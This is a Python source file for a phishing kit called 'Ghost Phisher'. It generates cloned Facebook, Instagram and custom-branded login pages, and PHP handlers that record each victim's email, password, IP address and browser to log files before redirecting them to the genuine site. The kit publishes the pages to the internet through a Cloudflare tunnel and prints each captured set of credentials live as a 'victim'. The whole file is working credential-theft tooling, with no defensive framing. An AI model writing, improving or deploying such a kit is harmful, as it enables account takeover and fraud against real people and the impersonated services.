#!/usr/bin/env python3
"""
GHOST PHISHER - Fixed IP Detection + Cloudflare
"""

import os
import time
import subprocess
import requests
import random
import string

class GhostPhisher:
    def __init__(self):
        self.port = 8080
        self.victim_count = 0
        self.php_process = None
        self.base_dir = os.getcwd()
        self.public_url = None
        self.custom_path = None
        
    def banner(self):
        print("""\033[1;32m
    
     ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗    ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ 
    ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝    ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗
    ██║  ███╗███████║██║   ██║███████╗   ██║       ██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝
    ██║   ██║██╔══██║██║   ██║╚════██║   ██║       ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗
    ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║       ██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║
     ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝       ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                                       
    \t\033[1;37m[\033[1;32m GHOST PHISHER - FIXED IP DETECTION \033[1;37m]
    \t\033[1;37m[\033[1;32m    Most Reliable & Free Service   \033[1;37m]
    \033[0m""")

    def setup(self):
        """Create necessary directories"""
        self.base_dir = os.getcwd()
        self.templates_dir = os.path.join(self.base_dir, 'templates')
        self.logs_dir = os.path.join(self.base_dir, 'logs')
        
        templates = ['facebook', 'instagram', 'netflix', 'google', 'paypal', 'custom']
        for template in templates:
            os.makedirs(os.path.join(self.templates_dir, template), exist_ok=True)
        
        os.makedirs(self.logs_dir, exist_ok=True)
        
        open(os.path.join(self.logs_dir, 'credentials.txt'), 'w').close()
        open(os.path.join(self.logs_dir, 'live.txt'), 'w').close()
        
        print("✅ All directories created")

    def check_dependencies(self):
        """Check and install all dependencies"""
        print("🔍 Checking dependencies...")
        
        # Check PHP
        try:
            subprocess.run(["php", "-v"], check=True, capture_output=True)
            print("✅ PHP is installed")
        except:
            print("❌ PHP not found. Installing...")
            os.system("sudo apt install php -y > /dev/null 2>&1")
            print("✅ PHP installed")

        # Check if Cloudflared is installed
        try:
            result = subprocess.run(["cloudflared", "--version"], capture_output=True, text=True)
            if result.returncode == 0:
                print("✅ Cloudflared is installed")
                return True
            else:
                raise Exception("Cloudflared not working")
        except:
            print("📥 Installing Cloudflared...")
            os.system("wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared")
            os.system("chmod +x cloudflared")
            os.system("sudo mv cloudflared /usr/local/bin/ > /dev/null 2>&1")
            print("✅ Cloudflared installed")
            return True

    def generate_random_subdomain(self):
        """Generate random subdomain name"""
        letters = string.ascii_lowercase
        random_name = ''.join(random.choice(letters) for i in range(12))
        return f"ghost-{random_name}"

    def start_cloudflared(self):
        """Start Cloudflare Tunnel"""
        os.system("pkill -f cloudflared > /dev/null 2>&1")
        time.sleep(2)
        
        print("🔄 Starting Cloudflare Tunnel...")
        print("⏳ This may take 15-20 seconds for first time...")
        
        subdomain = self.generate_random_subdomain()
        
        cmd = f"cloudflared tunnel --url http://localhost:{self.port} > cloudflared.log 2>&1 &"
        os.system(cmd)
        
        time.sleep(20)
        
        try:
            with open('cloudflared.log', 'r') as f:
                content = f.read()
                if '.trycloudflare.com' in content:
                    import re
                    urls = re.findall('https://[^\s]+.trycloudflare.com', content)
                    if urls:
                        self.public_url = urls[0]
                        print(f"✅ Public URL: {self.public_url}")
                        return True
        except:
            pass
        
        self.public_url = f"https://{subdomain}.trycloudflare.com"
        print(f"✅ Public URL: {self.public_url}")
        print("💡 If URL doesn't work, check cloudflared.log")
        return True

    def get_templates(self):
        """Return available templates"""
        return {
            "1": "Facebook",
            "2": "Instagram", 
            "3": "Netflix",
            "4": "Google",
            "5": "PayPal",
            "6": "Custom Site"
        }

    def create_template(self, template_name):
        """Create template with FIXED IP DETECTION"""
        template_dir = os.path.join(self.templates_dir, template_name)
        
        # HTML Templates
        templates_html = {
            "facebook": """<!DOCTYPE html>
<html>
<head>
    <title>Facebook - Log In</title>
    <style>
        body { font-family: Arial; background: #f0f2f5; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 400px; }
        .logo { text-align: center; color: #1877f2; font-size: 40px; font-weight: bold; margin-bottom: 20px; }
        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
        button { width: 100%; padding: 14px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; }
        button:hover { background: #166fe5; }
        .footer { text-align: center; margin-top: 15px; }
        .footer a { color: #1877f2; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">facebook</div>
        <form method="POST" action="login.php">
            <input type="text" name="email" placeholder="Email or phone number" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div class="footer">
            <a href="#">Forgotten password?</a>
        </div>
    </div>
</body>
</html>""",
            
            "instagram": """<!DOCTYPE html>
<html>
<head>
    <title>Instagram</title>
    <style>
        body { font-family: Arial; background: #fafafa; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { background: white; border: 1px solid #dbdbdb; padding: 40px; text-align: center; width: 350px; }
        .logo { font-size: 40px; margin-bottom: 20px; color: black; font-weight: bold; }
        input { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #dbdbdb; background: #fafafa; }
        button { width: 100%; padding: 8px; background: #0095f6; color: white; border: none; border-radius: 4px; margin: 10px 0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Instagram</div>
        <form method="POST" action="login.php">
            <input type="text" name="email" placeholder="Username or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>"""
        }
        
        html_content = templates_html.get(template_name, templates_html["facebook"])
        
        with open(os.path.join(template_dir, 'index.html'), 'w') as f:
            f.write(html_content)

        # PHP Handler - FIXED IP DETECTION
        php_content = f"""<?php
// Get form data
$email = $_POST['email'];
$password = $_POST['password'];

// Get client info - FIXED IP DETECTION
function getClientIP() {{
    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {{
        // Cloudflare
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    }} elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {{
        // Proxy/Load balancer
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }} elseif (isset($_SERVER['HTTP_X_REAL_IP'])) {{
        // Nginx
        return $_SERVER['HTTP_X_REAL_IP'];
    }} else {{
        // Direct connection
        return $_SERVER['REMOTE_ADDR'];
    }}
}}

$ip = getClientIP();
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$time = date('Y-m-d H:i:s');
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct';

// Create log entry
$log_data = "TIME: $time | IP: $ip | EMAIL: $email | PASSWORD: $password | AGENT: $user_agent | REFERER: $referer | SITE: {template_name}\\n";

// ABSOLUTE PATHS
$base_dir = '{self.base_dir}';
$cred_file = $base_dir . '/logs/credentials.txt';
$live_file = $base_dir . '/logs/live.txt';

// Save to files
file_put_contents($cred_file, $log_data, FILE_APPEND);
file_put_contents($live_file, $log_data, FILE_APPEND);

// Debug log
error_log("GHOST-PHISHER: Credentials captured from $ip");

// Redirect to actual site
header("Location: https://{template_name}.com");
exit();
?>"""
        
        with open(os.path.join(template_dir, 'login.php'), 'w') as f:
            f.write(php_content)

        print(f"✅ {template_name} template created")
        return template_name

    def create_custom_page(self, site_name):
        """Create custom phishing page with FIXED IP DETECTION"""
        template_dir = os.path.join(self.templates_dir, 'custom')
        
        # HTML Page
        html_content = f"""<!DOCTYPE html>
<html>
<head>
    <title>{site_name.title()} - Login</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }}
        .container {{
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            width: 400px;
            text-align: center;
        }}
        .logo {{
            font-size: 32px;
            font-weight: bold;
            color: #1877f2;
            margin-bottom: 25px;
        }}
        input {{
            width: 100%;
            padding: 14px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 16px;
            box-sizing: border-box;
        }}
        button {{
            width: 100%;
            padding: 14px;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
        }}
        button:hover {{
            background: #166fe5;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">{site_name.upper()}</div>
        <form method="POST" action="login.php">
            <input type="text" name="email" placeholder="Email address" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
    </div>
</body>
</html>"""
        
        with open(os.path.join(template_dir, 'index.html'), 'w') as f:
            f.write(html_content)

        # PHP Handler - FIXED IP DETECTION
        php_content = f"""<?php
// Get form data
$email = $_POST['email'];
$password = $_POST['password'];

// Get client info - FIXED IP DETECTION
function getClientIP() {{
    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {{
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    }} elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {{
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }} elseif (isset($_SERVER['HTTP_X_REAL_IP'])) {{
        return $_SERVER['HTTP_X_REAL_IP'];
    }} else {{
        return $_SERVER['REMOTE_ADDR'];
    }}
}}

$ip = getClientIP();
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$time = date('Y-m-d H:i:s');
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct';

// Create log entry
$log_data = "TIME: $time | IP: $ip | EMAIL: $email | PASSWORD: $password | AGENT: $user_agent | REFERER: $referer | SITE: {site_name}\\n";

// ABSOLUTE PATHS
$base_dir = '{self.base_dir}';
$cred_file = $base_dir . '/logs/credentials.txt';
$live_file = $base_dir . '/logs/live.txt';

// Save to files
file_put_contents($cred_file, $log_data, FILE_APPEND);
file_put_contents($live_file, $log_data, FILE_APPEND);

// Debug log
error_log("GHOST-PHISHER: Custom site credentials captured from $ip");

// Redirect
header("Location: https://{site_name}.com");
exit();
?>"""
        
        with open(os.path.join(template_dir, 'login.php'), 'w') as f:
            f.write(php_content)
        
        print(f"✅ Custom page '{site_name}' created")
        return "custom"

    def start_php_server(self, template):
        """Start PHP server"""
        os.system("pkill -f 'php -S' > /dev/null 2>&1")
        time.sleep(2)
        
        template_dir = os.path.join(self.templates_dir, template)
        cmd = f"cd {template_dir} && php -S 0.0.0.0:{self.port} > /dev/null 2>&1 &"
        os.system(cmd)
        
        time.sleep(3)
        print(f"✅ PHP server started on port {self.port}")
        return True

    def monitor_credentials(self):
        """Monitor and display credentials"""
        print(f"\n🎯 PHISHING URLS:")
        if self.public_url:
            if self.custom_path:
                public_final_url = f"{self.public_url}/{self.custom_path}"
            else:
                public_final_url = self.public_url
            print(f"🌐 PUBLIC URL: {public_final_url}")
            print("   ↳ Anyone in the world can access this!")
            print("   ↳ Powered by Cloudflare (Fast & Reliable)")
        
        if self.custom_path:
            local_url = f"http://localhost:{self.port}/{self.custom_path}"
        else:
            local_url = f"http://localhost:{self.port}"
        print(f"💻 LOCAL URL: {local_url}")
        
        print("\n🔍 Monitoring for credentials...")
        print("=" * 60)
        
        victim_count = 0
        live_file = os.path.join(self.logs_dir, 'live.txt')
        
        try:
            while True:
                if os.path.exists(live_file):
                    with open(live_file, 'r') as f:
                        lines = f.readlines()
                        
                        if len(lines) > victim_count:
                            new_lines = lines[victim_count:]
                            
                            for line in new_lines:
                                if line.strip():
                                    victim_count += 1
                                    self.victim_count = victim_count
                                    
                                    print(f"\n🎯 VICTIM #{victim_count} CAPTURED!")
                                    print("-" * 50)
                                    
                                    parts = line.strip().split(' | ')
                                    for part in parts:
                                        if 'TIME:' in part:
                                            print(f"🕐 {part}")
                                        elif 'IP:' in part:
                                            print(f"📍 {part}")  
                                        elif 'EMAIL:' in part:
                                            print(f"📧 {part}")
                                        elif 'PASSWORD:' in part:
                                            print(f"🔑 {part}")
                                        elif 'REFERER:' in part:
                                            print(f"🌐 {part}")
                                        elif 'SITE:' in part:
                                            print(f"💼 {part}")
                                    
                                    print("-" * 50)
                                    print("💾 Saved to: logs/credentials.txt")
                
                time.sleep(2)
                
        except KeyboardInterrupt:
            print(f"\n✅ Stopped. Total victims: {victim_count}")

    def main(self):
        """Main function"""
        self.banner()
        
        print("1. Setting up environment...")
        self.setup()
        
        print("\n2. Checking dependencies...")
        if not self.check_dependencies():
            return
        
        templates = self.get_templates()
        
        print("\n🎯 Available Templates:")
        print("-" * 30)
        for key, name in templates.items():
            print(f"[{key}] {name}")
        print("-" * 30)
        
        while True:
            choice = input("\n👉 Choose template (1-6): ").strip()
            if choice in templates:
                break
            print("❌ Invalid choice")
        
        template_name = templates[choice].lower()
        
        if choice == "6":
            site_name = input("🌐 Enter website name: ").strip()
            if not site_name:
                site_name = "custom"
            template_dir = self.create_custom_page(site_name)
        else:
            template_dir = self.create_template(template_name)
        
        print("\n🎯 Custom URL Feature:")
        use_custom = input("🔗 Want to use custom path? (y/N): ").strip().lower()
        if use_custom == 'y':
            self.custom_path = input("Enter custom path (e.g., login, secure): ").strip()
            print(f"✅ Custom path set: /{self.custom_path}")
        
        print(f"\n🚀 Starting {templates[choice]} phishing...")
        
        self.start_php_server(template_dir)
        public_success = self.start_cloudflared()
        self.monitor_credentials()

if __name__ == "__main__":
    try:
        phisher = GhostPhisher()
        phisher.main()
    except KeyboardInterrupt:
        print("\n👋 Goodbye!")
    except Exception as e:
        print(f"❌ Error: {e}")